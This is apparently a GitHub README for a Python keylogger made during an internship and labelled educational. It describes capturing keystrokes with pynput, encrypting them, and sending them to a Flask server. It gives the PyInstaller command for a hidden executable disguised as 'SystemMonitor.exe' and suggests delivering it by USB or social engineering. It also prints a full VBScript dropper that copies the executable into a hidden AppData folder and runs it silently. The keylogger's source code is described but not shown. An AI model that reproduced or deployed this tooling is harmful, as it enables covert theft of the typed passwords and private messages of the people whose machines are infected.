# Python-based Stealth Keylogger with Flask Exfiltration

> **Educational Use Only!** This keylogger project was built strictly for academic and cybersecurity awareness purposes. Unauthorized deployment is illegal and unethical.

---

## Project Overview

This Python-based keylogger captures keystrokes from a target system, encrypts them, and exfiltrates the data to a local Flask server. It is stealthily compiled into an `.exe` file and can be delivered via USB or remotely through links or social engineering. This keylogger attacks system that has Python installed in them.
Systems without Python, won't be able to run this keylogger properly.

### Features

*  Stealth keylogger (runs silently with no console window)
*  Encrypted keystroke logging with timestamp
*  Real-time exfiltration to a local Flask server
*  Log viewing via `/view` endpoint (with decryption)
*  Executable delivery (via PyInstaller)

---

## Project Structure

```
.
├── main.py              # Keylogger logic
├── server.py            # Flask server to receive logs
├── encryption.py        # Encryption/decryption logic
├── exfil.py             # Exfiltration helper
├── Logs/                # Received keystroke logs
├── dist/
│   └── SystemMonitor.exe   # Final compiled EXE
├── launch.vbs           # Dropper script
```

---

## Execution Steps

### 1. Install Dependencies

```bash
pip install flask pynput cryptography
```

### 2. Run Flask Server

```bash
python server.py
```
Basic server using `flask` module. This server is set up to capture each keystroke with timestamp. The use of '/view' and '/capture' is explained in description of `server.py` attachment. We have imported functions `encrypt()` and `decrypt()`, so that we can encrypt
### 3. Run Keylogger

```bash
python main.py
``` 
---

## Building the EXE (Stealth Mode)

```bash
pyinstaller --onefile --noconsole main.py
```
Make sure you have started your virtual environment before executing this command, otherwise you may face issues while running .exe file.
Output will be in `dist/SystemMonitor.exe`

---


## Dropper Script (launch.vbs)

```vbscript
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

src = fso.GetAbsolutePathName("SystemMonitor.exe")
destFolder = shell.ExpandEnvironmentStrings("%APPDATA%\WinLogs")
dest = destFolder & "\SystemMonitor.exe"

If Not fso.FolderExists(destFolder) Then
    fso.CreateFolder(destFolder)
End If
If Not fso.FileExists(dest) Then
    fso.CopyFile src, dest
    shell.Run "cmd /c attrib +h '" & dest & "'", 0, True
End If
shell.Run """" & dest & """", 0, False
```

---
## Scripts used

### main.py
The main logic for keylogger. It uses pynput library, which uses `keyboard.Listener()` that 'listens' or captures keystrokes. The pynput library is fully used for keyboard and mouse monitoring. What each function in main.py does:-
1. ** process_key(key): ** Processes a single keystroke, formats it for logging, and sends it to an external function (send_keystroke()) with a timestamp. It also handles special cases like the ESC key to stop the keylogger.
2. ** on_press(key): **
     - Calls `process_key(key)` to handle the key.
     - If process_key returns False (i.e., ESC was pressed), the function returns False, which stops the keyboard listener.
     - Otherwise, it implicitly returns None, allowing the listener to continue.
3. ** on_release(key): **
     - Input: Takes a key object from the pynput.keyboard listener.
     - Logic: Does nothing (pass) but can be extended to handle key release events if needed (e.g., logging key release times).
     - Return Value: Implicitly returns None.
The script terminates when `ESC` is pressed on keyboard.
---

### encryption.py

- Uses `cryptography` library's `fernet` class that generates a key and stores it in a file. 
- The library also helps in encryption and decryption. The key is used to and encrypt and decrypt keystroke data.
- The `load_key()` uses the existing key from key file for `encrypt(message)` and `decrypt(token)` operations. --- The `encrypt(message)` takes a string as an input and encrypts it into Fernet token(ciphertext).
- The `decrypt(token)` takes a Fernet token as input and decrypts it into original plaintext, using the key.
note: without the key, encryption and decryption won't take place.

---

### exfil.py

- Exfiltrates data from keylogger and sends it to local flask server
- It uses `requests` library to make HTTP POST requests to flask server
- It uses `json` library to store the keylogger data in JSON format before sending it as POST request.
- The `send_keystroke(raw,timestamp,url)` takes raw input(keystroke) and its time, along with URL which is your local device address and port 5000(default for flask), and sends info to the server endpoint `/capture`
- The function takes data as a dictionary that matches what your server expects(raw, timestamp). It will be converted to JSON and sent as the request body.

---

### server.py

- Basic server using `flask` module. This server is set up to capture each keystroke with timestamp. 
- The use of '/view' and '/capture' is explained in description of `server.py` attachment.
- We have imported functions `encrypt()` and `decrypt()`, so that we can encrypt the logs that will be stored in `keystrokes.txt` and view decrypted data at `/view` route.
- The server starts at port 5000 and host='0.0.0.0' allows access from any device on the same network (useful if the keylogger is on a different machine).
- The `/upload` route accepts full log files from the client. You could upload `keystrokes.txt` from any device using /upload route.

## Important
Press `ESC` button to terminate the keylogger program, if unable to do it so from task manager, and vice versa.

---

## Disclaimer

This project was developed **only for educational demonstrations** as a part of my internship. Misuse may be punishable under cybercrime laws.

> Be smart. Be ethical. Use your skills to protect, not harm.

---

## Credits

* Python `pynput` for keystroke monitoring
* Flask for exfil server
* Cryptography for Fernet encryption
  

---

**Author:** Nihar Sameer Nilatkar  
**GitHub:** github.com/NiharNilatkar  
**LinkedIn:** https://www.linkedin.com/in/nihar-nilatkar-6a0135332/  
